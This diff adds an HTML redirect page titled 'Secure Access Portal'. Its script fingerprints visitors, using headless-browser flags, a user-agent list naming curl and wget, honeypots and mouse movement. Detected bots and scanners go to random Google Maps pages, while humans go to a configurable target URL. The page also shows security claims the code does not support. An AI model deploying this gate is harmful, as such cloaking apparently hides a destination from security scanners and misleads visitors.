@@ -1,0 +1,381 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Secure Access Portal</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+        
+        body {
+            background: linear-gradient(135deg, #1a2a6c, #b21f1f, #fdbb2d);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            color: white;
+            overflow: hidden;
+        }
+        
+        .container {
+            max-width: 800px;
+            padding: 40px;
+            background: rgba(0, 0, 0, 0.7);
+            border-radius: 20px;
+            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.5);
+            text-align: center;
+            backdrop-filter: blur(10px);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+        }
+        
+        h1 {
+            margin-bottom: 20px;
+            font-size: 2.5rem;
+            background: linear-gradient(to right, #ff8a00, #da1b60);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            text-shadow: 0 2px 10px rgba(0, 0, 0, 0.2);
+        }
+        
+        p {
+            margin-bottom: 30px;
+            font-size: 1.2rem;
+            line-height: 1.6;
+            color: #e0e0e0;
+        }
+        
+        .status {
+            padding: 15px;
+            border-radius: 10px;
+            margin: 20px 0;
+            font-weight: bold;
+            transition: all 0.3s ease;
+        }
+        
+        .verifying {
+            background: rgba(255, 193, 7, 0.2);
+            border-left: 5px solid #ffc107;
+        }
+        
+        .success {
+            background: rgba(40, 167, 69, 0.2);
+            border-left: 5px solid #28a745;
+        }
+        
+        .warning {
+            background: rgba(220, 53, 69, 0.2);
+            border-left: 5px solid #dc3545;
+        }
+        
+        .loader {
+            width: 50px;
+            height: 50px;
+            border: 5px solid rgba(255, 255, 255, 0.3);
+            border-radius: 50%;
+            border-top-color: #fff;
+            animation: spin 1s ease-in-out infinite;
+            margin: 20px auto;
+        }
+        
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        
+        .hidden {
+            display: none;
+        }
+        
+        .button {
+            display: inline-block;
+            padding: 12px 30px;
+            background: linear-gradient(to right, #ff8a00, #da1b60);
+            color: white;
+            border: none;
+            border-radius: 50px;
+            font-size: 1.1rem;
+            font-weight: bold;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.3);
+            margin-top: 20px;
+        }
+        
+        .button:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 8px 20px rgba(0, 0, 0, 0.4);
+        }
+        
+        .security-badge {
+            margin-top: 30px;
+            padding: 10px;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 10px;
+            font-size: 0.9rem;
+        }
+        
+        .feature-list {
+            display: flex;
+            justify-content: space-around;
+            margin: 30px 0;
+            flex-wrap: wrap;
+        }
+        
+        .feature {
+            flex: 1;
+            min-width: 200px;
+            padding: 15px;
+            margin: 10px;
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 10px;
+        }
+        
+        .feature i {
+            font-size: 2rem;
+            margin-bottom: 10px;
+            display: block;
+            color: #ff8a00;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <h1>Secure Access Portal</h1>
+        <p>Advanced protection system ensuring secure access to resources</p>
+        
+        <div class="feature-list">
+            <div class="feature">
+                <i>🔒</i>
+                <h3>Encrypted Connection</h3>
+                <p>All data is transmitted through secure channels</p>
+            </div>
+            <div class="feature">
+                <i>🛡️</i>
+                <h3>Threat Protection</h3>
+                <p>Real-time monitoring for malicious activity</p>
+            </div>
+            <div class="feature">
+                <i>⚡</i>
+                <h3>Fast Verification</h3>
+                <p>Quick authentication without compromising security</p>
+            </div>
+        </div>
+        
+        <div id="statusVerifying" class="status verifying">
+            <div class="loader"></div>
+            <p>Verifying your request... Please wait</p>
+        </div>
+        
+        <div id="statusSuccess" class="status success hidden">
+            <p>✓ Verification successful! Redirecting to secure destination...</p>
+        </div>
+        
+        <div id="statusWarning" class="status warning hidden">
+            <p>⚠ Suspicious activity detected. Security protocols activated.</p>
+        </div>
+        
+        <div class="security-badge">
+            <p>Protected by Advanced Threat Detection System v2.5</p>
+        </div>
+    </div>
+
+    <!-- Invisible anti-bot traps -->
+    <div style="display:none">
+        <!-- Honeypot field -->
+        <input type="text" id="honeypot" name="honeypot" tabindex="-1" autocomplete="off">
+        
+        <!-- Invisible iframe to detect headless browsers -->
+        <iframe src="about:blank" id="botTrap" style="width:0;height:0;border:0;border:none;"></iframe>
+        
+        <!-- CSS-based bot trap -->
+        <div id="cssTrap" style="opacity:0;position:absolute;left:-10000px;"></div>
+    </div>
+
+    <script>
+        // Configuration
+        const TARGET_URL = "https://example.com"; // Change this to your desired URL
+        const BOT_REDIRECT_DELAY = 2000; // 2 seconds delay before redirecting bots
+        
+        // Random Google Maps locations
+        const BOT_LOCATIONS = [
+            "https://www.google.com/maps/@40.7128,-74.0060,15z", // New York
+            "https://www.google.com/maps/@34.0522,-118.2437,15z", // Los Angeles
+            "https://www.google.com/maps/@51.5074,-0.1278,15z",   // London
+            "https://www.google.com/maps/@48.8566,2.3522,15z",   // Paris
+            "https://www.google.com/maps/@35.6762,139.6503,15z", // Tokyo
+            "https://www.google.com/maps/@55.7558,37.6173,15z",  // Moscow
+            "https://www.google.com/maps/@-33.8688,151.2093,15z", // Sydney
+            "https://www.google.com/maps/@19.4326,-99.1332,15z", // Mexico City
+            "https://www.google.com/maps/@-23.5505,-46.6333,15z", // São Paulo
+            "https://www.google.com/maps/@39.9042,116.4074,15z"  // Beijing
+        ];
+        
+        // Bot detection functions
+        const botDetector = {
+            // Check for headless browser characteristics
+            isHeadless: function() {
+                // Check for common headless browser properties
+                if (navigator.webdriver) return true;
+                if (!navigator.languages || navigator.languages.length === 0) return true;
+                if (navigator.plugins.length === 0) return true;
+                
+                // Check viewport dimensions (headless often has unusual sizes)
+                if (window.outerWidth === 0 && window.outerHeight === 0) return true;
+                
+                // Check for PhantomJS
+                if (window.callPhantom || window._phantom) return true;
+                
+                return false;
+            },
+            
+            // Check user agent for common bots
+            hasBotUserAgent: function() {
+                const userAgent = navigator.userAgent.toLowerCase();
+                const botIndicators = [
+                    'bot', 'crawler', 'spider', 'scraper', 'phantom', 'headless',
+                    'selenium', 'puppeteer', 'playwright', 'curl', 'wget'
+                ];
+                
+                return botIndicators.some(indicator => userAgent.includes(indicator));
+            },
+            
+            // Check if browser supports advanced features (bots often lack these)
+            lacksAdvancedFeatures: function() {
+                // Check for WebGL (many headless browsers don't support it properly)
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                if (!gl) return true;
+                
+                // Check for audio context
+                if (!window.AudioContext && !window.webkitAudioContext) return true;
+                
+                return false;
+            },
+            
+            // Honeypot trap
+            checkHoneypot: function() {
+                const honeypot = document.getElementById('honeypot');
+                return honeypot.value !== '';
+            },
+            
+            // Check iframe behavior (bots often don't load iframes properly)
+            checkIframeBehavior: function() {
+                const iframe = document.getElementById('botTrap');
+                return iframe.contentWindow === null || iframe.contentDocument === null;
+            },
+            
+            // CSS-based trap (bots might interact with hidden elements)
+            checkCSSTrap: function() {
+                const trap = document.getElementById('cssTrap');
+                trap.addEventListener('click', () => true);
+                trap.addEventListener('focus', () => true);
+                
+                // Simulate a focus event to see if it gets triggered
+                try {
+                    trap.focus();
+                } catch(e) {}
+                
+                // Return true if any events were triggered (indicating bot behavior)
+                return trap.hasAttribute('data-triggered');
+            },
+            
+            // Mouse movement analysis (bots often don't move mouse)
+            checkMouseMovement: function() {
+                return new Promise(resolve => {
+                    let moved = false;
+                    const movementHandler = () => {
+                        moved = true;
+                        document.removeEventListener('mousemove', movementHandler);
+                    };
+                    
+                    document.addEventListener('mousemove', movementHandler);
+                    
+                    setTimeout(() => {
+                        resolve(!moved);
+                    }, 1000);
+                });
+            },
+            
+            // Performance timing analysis
+            checkPerformance: function() {
+                const perf = window.performance || window.webkitPerformance || window.msPerformance || window.mozPerformance;
+                
+                if (perf && perf.timing) {
+                    const loadTime = perf.timing.loadEventEnd - perf.timing.navigationStart;
+                    // Very fast or very slow load times can indicate automation
+                    if (loadTime < 100 || loadTime > 10000) return true;
+                }
+                
+                return false;
+            }
+        };
+        
+        // Main detection function
+        async function detectBot() {
+            const checks = [
+                botDetector.isHeadless(),
+                botDetector.hasBotUserAgent(),
+                botDetector.lacksAdvancedFeatures(),
+                botDetector.checkHoneypot(),
+                botDetector.checkIframeBehavior(),
+                botDetector.checkCSSTrap(),
+                botDetector.checkPerformance()
+            ];
+            
+            // Also check mouse movement (async)
+            const noMouseMovement = await botDetector.checkMouseMovement();
+            checks.push(noMouseMovement);
+            
+            // Count how many bot indicators were detected
+            const botIndicators = checks.filter(Boolean).length;
+            
+            // If 2 or more indicators, consider it a bot
+            return botIndicators >= 2;
+        }
+        
+        // Main execution
+        document.addEventListener('DOMContentLoaded', async function() {
+            // Show verifying status
+            document.getElementById('statusVerifying').classList.remove('hidden');
+            
+            // Wait a bit to simulate verification process
+            await new Promise(resolve => setTimeout(resolve, 1500));
+            
+            // Run bot detection
+            const isBot = await detectBot();
+            
+            // Hide verifying status
+            document.getElementById('statusVerifying').classList.add('hidden');
+            
+            if (isBot) {
+                // Bot detected - show warning and redirect to random location
+                document.getElementById('statusWarning').classList.remove('hidden');
+                
+                setTimeout(() => {
+                    const randomLocation = BOT_LOCATIONS[Math.floor(Math.random() * BOT_LOCATIONS.length)];
+                    window.location.href = randomLocation;
+                }, BOT_REDIRECT_DELAY);
+            } else {
+                // Human detected - show success and redirect to target URL
+                document.getElementById('statusSuccess').classList.remove('hidden');
+                
+                setTimeout(() => {
+                    window.location.href = TARGET_URL;
+                }, 1000);
+            }
+        });
+        
+        // Additional protection: monitor for automation attempts
+        window.addEventListener('load', function() {
+            // Check if page was loaded in an iframe (common for some bots)
+            if (window.self !== window.top) {
+                window.top.location.href = BOT_LOCATIONS[Math.floor(Math.random() * BOT_LOCATIONS.length)];
+            }
+        });
+    </script>
+</body>
+</html>
